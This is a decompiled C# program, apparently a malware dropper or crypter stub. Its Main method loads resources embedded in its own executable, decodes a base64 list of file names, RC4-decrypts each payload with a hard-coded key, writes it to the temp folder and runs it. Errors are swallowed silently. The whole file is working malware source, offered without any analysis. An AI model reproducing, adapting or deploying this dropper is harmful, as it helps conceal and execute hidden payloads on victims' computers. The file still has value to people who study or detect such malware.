using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace data;

public class d
{
	[DebuggerNonUserCode]
	public d()
	{
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr FindResourceA(IntPtr hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name, IntPtr type);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

	public static byte[] RC4EnDeCrypt(byte[] plaintxt, byte[] password)
	{
		int[] sbox = new int[257];
		int num = 0;
		int num2 = 0;
		RC4Initialize(password, ref sbox);
		int num3 = checked(plaintxt.Length - 1);
		int num4 = 0;
		while (true)
		{
			int num5 = num4;
			int num6 = num3;
			if (num5 > num6)
			{
				break;
			}
			num = checked(num + 1) % 256;
			num2 = checked(num2 + sbox[num]) % 256;
			int num7 = sbox[num];
			sbox[num] = sbox[num2];
			sbox[num2] = num7;
			int value = sbox[checked(sbox[num] + sbox[num2]) % 256];
			plaintxt[num4] = (byte)(plaintxt[num4] ^ Convert.ToByte(value));
			num4 = checked(num4 + 1);
		}
		return plaintxt;
	}

	protected static void RC4Initialize(byte[] key, ref int[] sbox)
	{
		int num = key.Length;
		int num2 = 0;
		do
		{
			sbox[num2] = num2;
			num2 = checked(num2 + 1);
		}
		while (num2 <= 255);
		int num3 = 0;
		num2 = 0;
		do
		{
			num3 = checked(num3 + sbox[num2] + unchecked((int)key[num2 % num])) % 256;
			int num4 = sbox[num2];
			sbox[num2] = sbox[num3];
			sbox[num3] = num4;
			num2 = checked(num2 + 1);
		}
		while (num2 <= 255);
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			string text = ConvertFromBase64(new string(Encoding.ASCII.GetChars(ReadMyself("payload0"))));
			string[] array = text.Split(new char[1] { '\r' });
			int num = Conversions.ToInteger(array[0]);
			int num2 = 1;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text2 = Path.GetTempPath() + array[num2].Trim();
					File.WriteAllBytes(text2, RC4EnDeCrypt(ReadMyself("payload" + Conversions.ToString(num2)), Encoding.ASCII.GetBytes("72389")));
					Process.Start(text2);
					num2 = checked(num2 + 1);
					continue;
				}
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] ReadMyself(string ResName)
	{
		IntPtr type = new IntPtr(10);
		string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
		IntPtr moduleHandleA = GetModuleHandleA(ref moduleName);
		IntPtr hResInfo = FindResourceA(moduleHandleA, ref ResName, type);
		int num = SizeofResource(moduleHandleA, hResInfo);
		IntPtr source = LoadResource(moduleHandleA, hResInfo);
		byte[] array = new byte[checked(num - 1 + 1)];
		Marshal.Copy(source, array, 0, array.Length);
		return array;
	}

	public static string ConvertFromBase64(string input)
	{
		return new string(Encoding.ASCII.GetChars(Convert.FromBase64String(input)));
	}
}
